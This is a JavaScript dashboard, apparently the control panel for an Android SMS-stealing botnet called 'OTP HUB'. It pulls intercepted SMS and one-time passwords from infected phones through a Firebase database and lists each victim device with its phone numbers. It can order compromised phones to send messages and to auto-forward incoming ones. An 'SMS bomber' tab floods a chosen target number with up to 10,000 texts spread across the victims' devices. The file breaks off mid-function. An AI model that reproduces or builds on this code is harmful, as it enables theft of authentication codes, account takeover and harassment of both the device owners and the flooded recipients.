/* ============================================
   OTP HUB — Mobile Dashboard Logic
   Card-based rendering, bottom sheet modal,
   touch-optimized interactions
   ============================================ */

const LIST_PATH = "user_list";
const DATA_PATH = "user_data";
const SMS_PATH = "user_sms";
const CARD_PATH = "Card";

let FB_URL = "";

// ---- State ----
const state = {
    devices: [],
    mutedDevices: new Set(),
    rawFullData: {},
    deviceFilter: 'all',

    localSmsCache: {},
    globalSortedMsgs: [],
    smsKeyMap: {},
    smsPageIndex: 0,
    smsPageSize: 30,
    sheetPageIndex: 0,
    sheetPageSize: 10,
    sheetSmsInterval: null,

    // Bomber
    bomberMode: 'bomber', // 'bomber' or 'normal'
    bomberSim: '1',
    bomberRunning: false,
    bomberAbort: false,

    selectedSim: '1',
    sheetSim: '1',

    forwardThreads: {},
    forwardIntervals: {},

    currentSheetDevId: null,
    sheetSmsAll: [],
    sheetPageIndex: 0,
    sheetPageSize: 30,
};

// ---- Init ----
document.addEventListener('DOMContentLoaded', () => {
    updateHeaderTime();
    setInterval(updateHeaderTime, 1000);

    const msgBody = document.getElementById('messageBody');
    if (msgBody) {
        msgBody.addEventListener('input', () => {
            document.getElementById('charCount').textContent = msgBody.value.length;
        });
    }

    const searchInput = document.getElementById('deviceSearch');
    if (searchInput) {
        searchInput.addEventListener('input', () => refreshDeviceList());
    }

    // Prevent body scroll when sheet is open
    document.getElementById('deviceSheet').addEventListener('touchmove', (e) => {
        const container = document.getElementById('sheetContainer');
        if (!container.contains(e.target)) e.preventDefault();
    }, { passive: false });

    // Auto-fetch devices on first load (Moved to selectServer)
    // fetchDevices();
});
function selectServer(url, name = 'RAVAN') {
    FB_URL = url;
    document.getElementById('serverModal').classList.add('hidden');
    
    // Update Header Name with animation and emoji
    const headerName = document.getElementById('headerServerName');
    if (headerName) {
        const emojis = ['🚀', '⚡', '🔥', '👑', '💎', '✨', '🌟', '💥'];
        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
        headerName.innerHTML = `${name.toUpperCase()} ${emoji}`;
        
        // Retrigger animation
        headerName.style.animation = 'none';
        headerName.offsetHeight; /* trigger reflow */
        headerName.style.animation = 'gradientText 4s linear infinite';
    }
    
    fetchDevices();
}
function logout() {
    FB_URL = "";
    document.getElementById('serverModal').classList.remove('hidden');
    
    // Clear data
    state.devices = [];
    state.rawFullData = {};
    document.getElementById('deviceList').innerHTML = '<div class="empty-state" id="deviceEmpty" style="display:flex;"><svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" opacity="0.3"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg><p>No devices loaded</p><span>Tap "Fetch" to get started</span></div>';
    document.getElementById('smsList').innerHTML = '<div class="empty-state" id="smsEmpty" style="display:flex;"><svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" opacity="0.3"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg><p>No SMS logs</p><span>Tap "Refresh" to fetch</span></div>';
    updateStats(0, 0, 0);
    document.getElementById('smsCountBadge').textContent = '0';
    showToast('Logged out', 'info');
}

// ---- Tab Switch ----
function switchTab(tabName) {
    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
    const panel = document.getElementById('panel' + tabName.charAt(0).toUpperCase() + tabName.slice(1));
    if (panel) {
        panel.classList.remove('active');
        void panel.offsetWidth;
        panel.classList.add('active');
    }

    document.querySelectorAll('.nav-item').forEach(n => {
        n.classList.toggle('active', n.dataset.tab === tabName);
    });

    // Scroll to top
    document.getElementById('mainContent').scrollTop = 0;

    // Auto-fetch data for the selected tab
    autoFetchForTab(tabName);
}

// Auto-fetch: triggers fetch when tab is opened
function autoFetchForTab(tabName) {
    switch (tabName) {
        case 'sender':
            if (state.devices.length === 0) fetchDevices();
            break;
        case 'logs':
            fetchAllSms();
            break;
        case 'bomber':
            updateBomberDeviceInfo();
            break;
        case 'pages':
            fetchPagesData();
            break;
    }
}

// ---- Header Time ----
function updateHeaderTime() {
    const now = new Date();
    const t = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
    document.getElementById('headerTime').textContent = t;
}

// ---- Status ----
function setStatus(text, type = 'normal') {
    document.getElementById('statusText').textContent = text;
    const dot = document.getElementById('statusDot');
    dot.className = 'status-dot' + (type === 'loading' ? ' loading' : type === 'error' ? ' error' : '');
}

// ---- Toast ----
function showToast(message, type = 'info') {
    const container = document.getElementById('toastContainer');
    const icons = { success: '✓', error: '✕', info: 'ℹ', warning: '⚠' };
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.innerHTML = `<span class="toast-icon">${icons[type] || 'ℹ'}</span><span>${message}</span>`;
    container.appendChild(toast);
    setTimeout(() => {
        toast.classList.add('exit');
        setTimeout(() => toast.remove(), 250);
    }, 3000);
}

// ---- SIM ----
function selectSim(slot) {
    state.selectedSim = String(slot);
    document.querySelectorAll('.form-card .sim-btn').forEach(b => b.classList.toggle('active', b.dataset.slot === String(slot)));
}

function selectSheetSim(slot) {
    state.sheetSim = String(slot);
    document.querySelectorAll('.sheet-section .sim-sm .sim-btn').forEach(b => b.classList.toggle('active', b.dataset.slot === String(slot)));
}

// ---- Filter ----
function setDeviceFilter(f) {
    state.deviceFilter = f;
    document.querySelectorAll('.filter-row .pill').forEach(p => p.classList.toggle('active', p.dataset.filter === f));
    refreshDeviceList();
}

// ============================================
// TAB 1: DEVICES
// ============================================

async function fetchDevices() {
    setStatus('Fetching…', 'loading');
    const btn = document.getElementById('fetchDevicesBtn');
    btn.disabled = true;
    btn.textContent = '…';

    try {
        const [rList, rMuted, rData] = await Promise.all([
            fetch(`${FB_URL}/${LIST_PATH}.json?shallow=true`).then(r => r.json()),
            fetch(`${FB_URL}/user_muted_list.json?shallow=true`).then(r => r.json()),
            fetch(`${FB_URL}/${DATA_PATH}.json`).then(r => r.json()),
        ]);

        state.mutedDevices = new Set(rMuted ? Object.keys(rMuted) : []);
        const allIds = new Set([...Object.keys(rList || {}), ...state.mutedDevices]);
        const merged = {};
        allIds.forEach(id => { merged[id] = (rData || {})[id] || { d_name: "Unknown" }; });

        state.rawFullData = merged;
        renderDeviceList(merged);
        populateSenderDropdowns();
        setStatus('Ready');
        showToast(`${Object.keys(merged).length} devices loaded`, 'success');
    } catch (e) {
        setStatus('Error', 'error');
        showToast(e.message, 'error');
    } finally {
        btn.disabled = false;
        btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg> Fetch`;
    }
}

function renderDeviceList(data) {
    const list = document.getElementById('deviceList');
    const empty = document.getElementById('deviceEmpty');
    const search = (document.getElementById('deviceSearch')?.value || '').toLowerCase();

    // Remove old cards (keep empty state)
    list.querySelectorAll('.device-card').forEach(c => c.remove());
    state.devices = [];
    let online = 0, muted = 0;

    if (!data || Object.keys(data).length === 0) {
        empty.style.display = 'flex';
        updateStats(0, 0, 0);
        return;
    }

    const sortedIds = Object.keys(data).sort();
    const fragment = document.createDocumentFragment();

    sortedIds.forEach(devId => {
        const isMuted = state.mutedDevices.has(devId);
        if (isMuted) muted++;
        const info = typeof data[devId] === 'object' ? data[devId] : { d_name: String(data[devId]) };

        if (state.deviceFilter === 'active' && isMuted) return;
        if (state.deviceFilter === 'muted' && !isMuted) return;

        const model = info.model || info.d_name || 'Device';
        const number = info.numberSim1 || info.sim1Number || info.phoneNumber || '';

        if (search) {
            const match = devId.toLowerCase().includes(search) || model.toLowerCase().includes(search) || number.toLowerCase().includes(search);
            if (!match) return;
        }

        const isOnline = info.status === true || info.status === 'online';
        if (isOnline) online++;

        const card = document.createElement('div');
        card.className = `device-card${isMuted ? ' muted-card' : ''}`;
        card.dataset.deviceId = devId;
        card.innerHTML = `
            <input type="checkbox" class="dc-check device-checkbox" data-device-id="${devId}">
            <div class="dc-icon">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
            </div>
            <div class="dc-body">
                <div class="dc-id">${esc(devId)}</div>
                <div class="dc-model">${esc(model)}</div>
            </div>
            <div class="dc-status">
                <span class="status-dot-inline ${isOnline ? 'online' : 'offline'}">${isOnline ? 'Online' : 'Offline'}</span>
                ${isMuted ? '<span class="mute-badge">MUTED</span>' : ''}
            </div>
        `;

        // Tap card → open sheet
        card.addEventListener('click', (e) => {
            if (e.target.type === 'checkbox') return;
            openSheet(devId);
        });

        fragment.appendChild(card);
        state.devices.push(devId);
    });

    list.appendChild(fragment);
    empty.style.display = state.devices.length === 0 ? 'flex' : 'none';
    updateStats(state.devices.length, online, muted);
}

function refreshDeviceList() {
    renderDeviceList(state.rawFullData);
}

function updateStats(total, online, muted) {
    document.getElementById('deviceCountVal').textContent = total;
    document.getElementById('onlineCountVal').textContent = online;
    document.getElementById('mutedCountVal').textContent = muted;
}

function populateSenderDropdowns() {
    ['sheetSenderDevice', 'normalSenderSelect'].forEach(id => {
        const sel = document.getElementById(id);
        if (!sel) return;
        const val = sel.value;
        sel.innerHTML = '<option value="">— Select —</option>';
        
        // Add "ALL" option only for Normal Bomber mode
        if (id === 'normalSenderSelect' && state.devices.length > 0) {
            const optAll = document.createElement('option');
            optAll.value = 'ALL';
            optAll.textContent = `— ALL Devices (${state.devices.length}) —`;
            optAll.style.fontWeight = 'bold';
            optAll.style.color = 'var(--green)';
            sel.appendChild(optAll);
        }

        state.devices.forEach(d => {
            const opt = document.createElement('option');
            opt.value = d;
            opt.textContent = d.length > 28 ? d.substring(0, 28) + '…' : d;
            sel.appendChild(opt);
        });
        if (val) sel.value = val;
    });
}

// ---- Selection Helpers ----
function toggleSelectAll(cb) {
    document.querySelectorAll('.device-checkbox').forEach(c => c.checked = cb.checked);
}

function selectAllDevices() {
    document.querySelectorAll('.device-checkbox').forEach(c => c.checked = true);
}

function getSelectedDeviceIds() {
    return [...document.querySelectorAll('.device-checkbox:checked')].map(c => c.dataset.deviceId);
}

async function toggleMuteSelected() {
    const sel = getSelectedDeviceIds();
    if (!sel.length) return showToast('Select devices', 'warning');
    setStatus('Updating…', 'loading');
    let ok = 0;
    for (const id of sel) {
        try {
            if (state.mutedDevices.has(id)) {
                await fetch(`${FB_URL}/user_muted_list/${id}.json`, { method: 'DELETE' });
                await fetch(`${FB_URL}/${LIST_PATH}/${id}.json`, { method: 'PUT', body: 'true', headers: { 'Content-Type': 'application/json' } });
            } else {
                await fetch(`${FB_URL}/${LIST_PATH}/${id}.json`, { method: 'DELETE' });
                await fetch(`${FB_URL}/user_muted_list/${id}.json`, { method: 'PUT', body: 'true', headers: { 'Content-Type': 'application/json' } });
            }
            ok++;
        } catch (e) {}
    }
    showToast(`Updated ${ok} devices`, 'success');
    fetchDevices();
}

async function unmuteSelected() {
    const sel = getSelectedDeviceIds();
    if (!sel.length) return showToast('Select devices', 'warning');
    setStatus('Unmuting…', 'loading');
    let ok = 0;
    for (const id of sel) {
        if (!state.mutedDevices.has(id)) continue;
        try {
            await fetch(`${FB_URL}/user_muted_list/${id}.json`, { method: 'DELETE' });
            await fetch(`${FB_URL}/${LIST_PATH}/${id}.json`, { method: 'PUT', body: 'true', headers: { 'Content-Type': 'application/json' } });
            ok++;
        } catch (e) {}
    }
    if (ok) showToast(`Unmuted ${ok}`, 'success');
    fetchDevices();
}



// ============================================
// TAB 2: SMS LOGS
// ============================================

async function fetchAllSms() {
    setStatus('Fetching SMS…', 'loading');
    const btn = document.getElementById('fetchSmsBtn');
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span>';

    try {
        const rShallow = await fetch(`${FB_URL}/${SMS_PATH}.json?shallow=true`).then(r => r.json());
        const devIds = rShallow ? Object.keys(rShallow).slice(0, 60) : [];
        const dict = {};

        for (let i = 0; i < devIds.length; i += 30) {
            const batch = devIds.slice(i, i + 30);
            const results = await Promise.allSettled(
                batch.map(id => fetch(`${FB_URL}/${SMS_PATH}/${id}.json`, { signal: AbortSignal.timeout(10000) }).then(r => r.json()).then(d => ({ id, d })))
            );
            results.forEach(r => { if (r.status === 'fulfilled' && r.value.d) dict[r.value.id] = r.value.d; });
            setStatus(`SMS ${Math.min(i + 30, devIds.length)}/${devIds.length}…`, 'loading');
        }

        state.localSmsCache = dict;
        updateSmsTree(dict);
        setStatus('Ready');
    } catch (e) {
        setStatus('Error', 'error');
        showToast(e.message, 'error');
    } finally {
        btn.disabled = false;
        btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg> Refresh`;
    }
}

function updateSmsTree(data) {
    if (!data) data = state.localSmsCache;
    const showMuted = document.getElementById('showMutedSms')?.checked || false;
    const all = [];

    Object.entries(data).forEach(([devId, msgs]) => {
        if (!msgs || typeof msgs !== 'object') return;
        if (state.mutedDevices.has(devId) && !showMuted) return;
        Object.entries(msgs).forEach(([k, v]) => {
            if (!v || typeof v !== 'object') return;
            all.push({
                time: v.date || v.time || v.TimeandDate || 'Unknown',
                device: devId,
                sender: v.sender || v.number || 'Unknown',
                body: v.body || v.message || v.msg || '',
                ts: v.timestamp || 0,
                key: k
            });
        });
    });

    all.sort((a, b) => (parseInt(b.ts) || 0) - (parseInt(a.ts) || 0));
    state.globalSortedMsgs = all;
    state.smsPageIndex = 0;
    document.getElementById('smsCountBadge').textContent = all.length;
    renderSmsPage();
}

function renderSmsPage() {
    const list = document.getElementById('smsList');
    const empty = document.getElementById('smsEmpty');
    const pagination = document.getElementById('smsPagination');

    list.querySelectorAll('.sms-card').forEach(c => c.remove());
    state.smsKeyMap = {};

    const total = state.globalSortedMsgs.length;
    if (total === 0) {
        empty.style.display = 'flex';
        pagination.style.display = 'none';
        return;
    }

    empty.style.display = 'none';
    pagination.style.display = 'flex';

    const pages = Math.ceil(total / state.smsPageSize);
    const start = state.smsPageIndex * state.smsPageSize;
    const slice = state.globalSortedMsgs.slice(start, start + state.smsPageSize);

    const frag = document.createDocumentFragment();
    slice.forEach((m, i) => {
        const id = `sms_${start + i}`;
        const card = document.createElement('div');
        card.className = 'sms-card';
        card.id = id;
        card.innerHTML = `
            <div class="sms-card-top">
                <span class="sms-card-sender">${esc(m.sender)}</span>
                <span class="sms-card-time">${esc(String(m.time))}</span>
            </div>
            <div class="sms-card-device">${esc(m.device)}</div>
            <div class="sms-card-body">${esc(m.body)}</div>
        `;
        card.addEventListener('click', () => {
            list.querySelectorAll('.sms-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            openSheet(m.device, `Last sender: ${m.sender}`);
        });
        frag.appendChild(card);
        state.smsKeyMap[id] = { device: m.device, key: m.key };
    });

    list.appendChild(frag);
    document.getElementById('smsPageInfo').textContent = `${state.smsPageIndex + 1} / ${pages}`;
    document.getElementById('smsPrevBtn').disabled = state.smsPageIndex <= 0;
    document.getElementById('smsNextBtn').disabled = state.smsPageIndex >= pages - 1;
}

function prevSmsPage() { if (state.smsPageIndex > 0) { state.smsPageIndex--; renderSmsPage(); document.getElementById('mainContent').scrollTop = 0; } }
function nextSmsPage() { const p = Math.ceil(state.globalSortedMsgs.length / state.smsPageSize); if (state.smsPageIndex < p - 1) { state.smsPageIndex++; renderSmsPage(); document.getElementById('mainContent').scrollTop = 0; } }

// ============================================
// TAB 3: SMS BOMBER
// ============================================

function setBomberMode(mode) {
    state.bomberMode = mode;
    document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.mode === mode));
    
    if (mode === 'normal') {
        document.getElementById('bomberSettings').style.display = 'none';
        document.getElementById('normalSettings').style.display = 'block';
        document.getElementById('bomberLaunchBtn').innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 2L11 13"/><path d="M22 2L15 22L11 13L2 9L22 2Z"/></svg> SEND MESSAGE`;
        
        // Auto-select first device if none selected
        const sel = document.getElementById('normalSenderSelect');
        if (!sel.value && sel.options.length > 1) {
            sel.selectedIndex = 1;
        }
    } else {
        document.getElementById('bomberSettings').style.display = 'block';
        document.getElementById('normalSettings').style.display = 'none';
        document.getElementById('bomberLaunchBtn').innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 2L11 13"/><path d="M22 2L15 22L11 13L2 9L22 2Z"/></svg> START BOMBING`;
    }
}

function selectBomberSim(slot) {
    state.bomberSim = String(slot);
    document.querySelectorAll('#panelBomber .sim-btn').forEach(b => b.classList.toggle('active', b.dataset.slot === String(slot)));
}

function adjustBomberCount(delta) {
    const input = document.getElementById('bomberCount');
    let val = parseInt(input.value) || 50;
    val = Math.max(1, Math.min(10000, val + delta));
    input.value = val;
}

function adjustBomberDelay(delta) {
    const input = document.getElementById('bomberDelay');
    let val = parseInt(input.value) || 200;
    val = Math.max(0, Math.min(10000, val + delta));
    input.value = val;
}

function updateBomberDeviceInfo() {
    const active = state.devices.filter(id => !state.mutedDevices.has(id));
    const el = document.getElementById('bomberDeviceInfo');
    if (el) el.textContent = `${active.length} devices available`;
}

function addBomberLog(num, deviceId, success, msg) {
    const log = document.getElementById('bomberLog');
    const empty = document.getElementById('bomberLogEmpty');
    if (empty) empty.style.display = 'none';

    const entry = document.createElement('div');
    entry.className = `log-entry ${success ? 'log-success' : 'log-fail'}`;
    entry.innerHTML = `
        <span class="log-num">#${num}</span>
        <span class="log-device">${esc(deviceId.substring(0, 16))}…</span>
        <span>${success ? '✓ Sent' : '✕ Failed'}</span>
    `;

    // Insert at top
    if (log.firstChild) log.insertBefore(entry, log.firstChild);
    else log.appendChild(entry);

    // Keep max 200 entries
    while (log.children.length > 200) log.removeChild(log.lastChild);
}

async function startBomber() {
    if (state.bomberRunning) return;

    const target = document.getElementById('bomberTarget').value.trim();
    const message = document.getElementById('bomberMessage').value.trim();
    const count = parseInt(document.getElementById('bomberCount').value) || 50;
    const delay = parseInt(document.getElementById('bomberDelay').value) || 200;

    if (!target) return showToast('Enter target number', 'warning');
    if (!message) return showToast('Enter message', 'warning');

    const activeDevices = state.devices.filter(id => !state.mutedDevices.has(id));
    
    // Normal mode check
    if (state.bomberMode === 'normal') {
        const sender = document.getElementById('normalSenderSelect').value;
        if (!sender) return showToast('Select a sender device', 'warning');
        
        setStatus('Sending…', 'loading');
        document.getElementById('bomberLaunchBtn').disabled = true;

        if (sender === 'ALL') {
            if (activeDevices.length === 0) {
                document.getElementById('bomberLaunchBtn').disabled = false;
                setStatus('Ready');
                return showToast('No active devices available', 'error');
            }

            let okCount = 0;
            let failCount = 0;

            // Clear log
            const log = document.getElementById('bomberLog');
            log.querySelectorAll('.log-entry').forEach(e => e.remove());
            const empty = document.getElementById('bomberLogEmpty');
            if (empty) empty.style.display = 'none';

            // Send from all devices in parallel batches of 20 for max speed
            const BATCH_SIZE = 20;
            for (let b = 0; b < activeDevices.length; b += BATCH_SIZE) {
                const batch = activeDevices.slice(b, b + BATCH_SIZE);
                setStatus(`Sending batch ${Math.floor(b / BATCH_SIZE) + 1}… (${b}/${activeDevices.length})`, 'loading');
                const results = await Promise.allSettled(
                    batch.map((devId, idx) => {
                        const globalIdx = b + idx + 1;
                        return fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`, {
                            method: 'PATCH',
                            body: JSON.stringify({
                                command: "send message",
                                phoneNumber: target,
                                messageText: message,
                                simSlot: state.bomberSim,
                                targetDeviceId: devId
                            }),
                            headers: { 'Content-Type': 'application/json' },
                        }).then(r => {
                            if (r.ok) { okCount++; addBomberLog(globalIdx, devId, true, 'Sent Normal (ALL)'); }
                            else { failCount++; addBomberLog(globalIdx, devId, false, 'Failed Normal (ALL)'); }
                        }).catch(() => {
                            failCount++;
                            addBomberLog(globalIdx, devId, false, 'Error Normal (ALL)');
                        });
                    })
                );
            }
            showToast(`Done! Sent: ${okCount}, Failed: ${failCount}`, okCount > 0 ? 'success' : 'error');
        } else {
            // Single device mode
            try {
                const r = await fetch(`${FB_URL}/${DATA_PATH}/${sender}.json`, {
                    method: 'PATCH',
                    body: JSON.stringify({
                        command: "send message",
                        phoneNumber: target,
                        messageText: message,
                        simSlot: state.bomberSim,
                        targetDeviceId: sender
                    }),
                    headers: { 'Content-Type': 'application/json' },
                });
                if (r.ok) {
                    showToast('Message sent!', 'success');
                    addBomberLog(1, sender, true, 'Sent via Normal Mode');
                } else {
                    showToast('Failed to send', 'error');
                    addBomberLog(1, sender, false, 'Failed via Normal Mode');
                }
            } catch (e) {
                showToast('Network error', 'error');
                addBomberLog(1, sender, false, 'Network error');
            }
        }
        
        document.getElementById('bomberLaunchBtn').disabled = false;
        setStatus('Ready');
        return;
    }

    // Bomber mode logic
    if (activeDevices.length === 0) return showToast('No active devices. Fetch devices first.', 'error');

    state.bomberRunning = true;
    state.bomberAbort = false;

    // UI updates
    document.getElementById('bomberLaunchBtn').style.display = 'none';
    document.getElementById('bomberStopBtn').style.display = 'block';
    document.getElementById('bomberProgress').style.display = 'block';
    document.getElementById('bomberSentCount').textContent = '0';
    document.getElementById('bomberFailCount').textContent = '0';
    document.getElementById('bomberTotalCount').textContent = count;

    // Clear old log
    const log = document.getElementById('bomberLog');
    log.querySelectorAll('.log-entry').forEach(e => e.remove());
    const empty = document.getElementById('bomberLogEmpty');
    if (empty) empty.style.display = 'none';

    setStatus('Bombing…', 'loading');
    let sent = 0, failed = 0;

    // Fire in parallel batches of 20 for maximum speed
    const BOMB_BATCH = 20;
    for (let b = 0; b < count; b += BOMB_BATCH) {
        if (state.bomberAbort) break;

        const batchEnd = Math.min(b + BOMB_BATCH, count);
        const batchItems = [];
        for (let i = b; i < batchEnd; i++) {
            batchItems.push({ idx: i, devId: activeDevices[i % activeDevices.length] });
        }

        setStatus(`Bombing batch ${Math.floor(b / BOMB_BATCH) + 1}… (${b}/${count})`, 'loading');

        await Promise.allSettled(
            batchItems.map(item => {
                const payload = {
                    command: "send message",
                    phoneNumber: target,
                    messageText: message,
                    simSlot: state.bomberSim,
                    targetDeviceId: item.devId,
                };
                return fetch(`${FB_URL}/${DATA_PATH}/${item.devId}.json`, {
                    method: 'PATCH',
                    body: JSON.stringify(payload),
                    headers: { 'Content-Type': 'application/json' },
                }).then(r => {
                    if (r.ok) { sent++; addBomberLog(item.idx + 1, item.devId, true); }
                    else { failed++; addBomberLog(item.idx + 1, item.devId, false); }
                }).catch(() => {
                    failed++;
                    addBomberLog(item.idx + 1, item.devId, false);
                });
            })
        );

        // Update counters after each batch
        document.getElementById('bomberSentCount').textContent = sent;
        document.getElementById('bomberFailCount').textContent = failed;

        const pct = Math.round((batchEnd / count) * 100);
        document.getElementById('bomberProgressText').textContent = `${batchEnd} / ${count}`;
        document.getElementById('bomberProgressPercent').textContent = `${pct}%`;
        document.getElementById('bomberProgressFill').style.width = `${pct}%`;

        // Tiny delay between batches only if user set delay > 0
        if (delay > 0 && batchEnd < count && !state.bomberAbort) {
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    // Done
    state.bomberRunning = false;
    document.getElementById('bomberLaunchBtn').style.display = 'flex';
    document.getElementById('bomberStopBtn').style.display = 'none';

    const aborted = state.bomberAbort;
    state.bomberAbort = false;
    setStatus(aborted ? 'Stopped' : 'Done');
    showToast(aborted ? `Stopped. Sent ${sent}/${count}` : `Done! Sent ${sent}, Failed ${failed}`, aborted ? 'warning' : 'success');
}

function stopBomber() {
    state.bomberAbort = true;
    showToast('Stopping…', 'warning');
}

// ============================================
// BOTTOM SHEET (Device Details)
// ============================================

async function openSheet(devId, extra = '') {
    state.currentSheetDevId = devId;
    state.sheetSmsAll = [];
    state.sheetPageIndex = 0;

    const sheet = document.getElementById('deviceSheet');
    sheet.classList.add('active');
    document.body.style.overflow = 'hidden';

    document.getElementById('sheetTitle').textContent = 'Device';
    document.getElementById('sheetDeviceId').textContent = devId;
    document.getElementById('sheetInfo').textContent = extra || 'Loading…';
    document.getElementById('sheetSmsList').innerHTML = '';
    document.getElementById('sheetSmsCount').textContent = '0';
    document.getElementById('sheetPagination').style.display = 'none';

    const detailEl = document.getElementById('sheetSmsDetail');
    if (detailEl) detailEl.style.display = 'none';
    const moreDetailsEl = document.getElementById('sheetMoreDetails');
    if (moreDetailsEl) { moreDetailsEl.style.display = 'none'; moreDetailsEl.innerHTML = ''; }

    populateSenderDropdowns();

    // Fetch info
    try {
        const data = await fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`).then(r => r.json());
        if (data && typeof data === 'object') {
            const txt = Object.entries(data).filter(([k, v]) => typeof v !== 'object').map(([k, v]) => `${k}: ${v}`).join('\n');
            document.getElementById('sheetInfo').textContent = txt || 'No info';
        }
    } catch (e) {
        document.getElementById('sheetInfo').textContent = 'Failed to load';
    }

    if (state.sheetSmsInterval) clearInterval(state.sheetSmsInterval);
    state.sheetSmsInterval = setInterval(() => fetchSheetSms(devId, true), 5000);
    fetchSheetSms(devId);
}

function refreshSheetSms() {
    if (!state.currentSheetDevId) return;
    fetchSheetSms(state.currentSheetDevId, false);
}

async function fetchSheetSms(devId, silent = false) {
    if (!silent) setStatus('Fetching SMS...', 'loading');
    try {
        const data = await fetch(`${FB_URL}/${SMS_PATH}/${devId}.json`).then(r => r.json());
        if (!silent) setStatus('Ready');
        if (!data) { document.getElementById('sheetSmsCount').textContent = '0'; return; }

        const msgs = [];
        Object.entries(data).forEach(([k, v]) => {
            if (!v || typeof v !== 'object') return;
            msgs.push({
                time: v.date || v.time || v.TimeandDate || 'Unknown',
                sender: v.sender || v.number || 'Unknown',
                body: v.body || v.message || v.msg || '',
                ts: v.timestamp || 0,
            });
        });
        msgs.sort((a, b) => (parseInt(b.ts) || 0) - (parseInt(a.ts) || 0));
        state.sheetSmsAll = msgs;
        state.sheetPageIndex = 0;
        document.getElementById('sheetSmsCount').textContent = msgs.length;
        renderSheetSmsPage();
    } catch (e) {
        if (!silent) {
            setStatus('Error', 'error');
            showToast('Failed to fetch SMS', 'error');
        }
    }
}

function renderSheetSmsPage() {
    const list = document.getElementById('sheetSmsList');
    const pagination = document.getElementById('sheetPagination');
    list.innerHTML = '';

    const msgs = state.sheetSmsAll;
    const total = msgs.length;
    if (total === 0) { pagination.style.display = 'none'; return; }

    pagination.style.display = 'flex';
    const pages = Math.ceil(total / state.sheetPageSize);
    const start = state.sheetPageIndex * state.sheetPageSize;
    const slice = msgs.slice(start, start + state.sheetPageSize);

    slice.forEach(m => {
        const card = document.createElement('div');
        card.className = 'sms-card';
        card.innerHTML = `
            <div class="sms-card-top">
                <span class="sms-card-sender">${esc(m.sender)}</span>
                <span class="sms-card-time">${esc(String(m.time))}</span>
            </div>
            <div class="sms-card-body">${esc(m.body)}</div>
        `;
        card.addEventListener('click', () => {
            const detail = document.getElementById('sheetSmsDetail');
            detail.style.display = 'block';
            document.getElementById('sheetSmsDetailBody').textContent = m.body;
            list.querySelectorAll('.sms-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
        });
        list.appendChild(card);
    });

    document.getElementById('sheetPageInfo').textContent = `${state.sheetPageIndex + 1} / ${pages}`;
    document.getElementById('sheetSmsPrev').disabled = state.sheetPageIndex <= 0;
    document.getElementById('sheetSmsNext').disabled = state.sheetPageIndex >= pages - 1;
}

function sheetPrevPage() { if (state.sheetPageIndex > 0) { state.sheetPageIndex--; renderSheetSmsPage(); } }
function sheetNextPage() { const p = Math.ceil(state.sheetSmsAll.length / state.sheetPageSize); if (state.sheetPageIndex < p - 1) { state.sheetPageIndex++; renderSheetSmsPage(); } }

function closeSheet() {
    const devId = state.currentSheetDevId;
    if (devId && state.forwardIntervals[devId]) {
        clearInterval(state.forwardIntervals[devId]);
        state.forwardThreads[devId] = false;
        delete state.forwardIntervals[devId];
    }
    if (state.sheetSmsInterval) {
        clearInterval(state.sheetSmsInterval);
        state.sheetSmsInterval = null;
    }
    state.currentSheetDevId = null;
    document.getElementById('deviceSheet').classList.remove('active');
    const moreDetailsEl = document.getElementById('sheetMoreDetails');
    if (moreDetailsEl) { moreDetailsEl.style.display = 'none'; moreDetailsEl.innerHTML = ''; }
    document.body.style.overflow = '';
}

// Close on overlay tap
document.addEventListener('click', (e) => {
    if (e.target.id === 'deviceSheet') closeSheet();
});

// ---- Send Single Message ----
async function sendSingleMessage() {
    const devId = state.currentSheetDevId;
    if (!devId) return;
    const phone = document.getElementById('sheetPhone').value.trim();
    const msg = document.getElementById('sheetMessage').value.trim();
    if (!phone || !msg) return showToast('Enter phone & message', 'warning');

    try {
        const r = await fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`, {
            method: 'PATCH',
            body: JSON.stringify({ command: "send message", phoneNumber: phone, messageText: msg, simSlot: state.sheetSim, targetDeviceId: devId }),
            headers: { 'Content-Type': 'application/json' },
        });
        if (r.ok) showToast('Sent!', 'success');
    } catch (e) {
        showToast(e.message, 'error');
    }
}

// ---- Auto Forward ----
function toggleForward() {
    const devId = state.currentSheetDevId;
    if (!devId) return;
    const btn = document.getElementById('sheetFwdBtn');
    const statusEl = document.getElementById('sheetFwdStatus');

    if (state.forwardThreads[devId]) {
        state.forwardThreads[devId] = false;
        clearInterval(state.forwardIntervals[devId]);
        delete state.forwardIntervals[devId];
        btn.textContent = 'Start';
        btn.className = 'action-btn action-primary';
        statusEl.textContent = 'Stopped.';
        return;
    }

    const targetPhone = document.getElementById('sheetFwdPhone').value.trim();
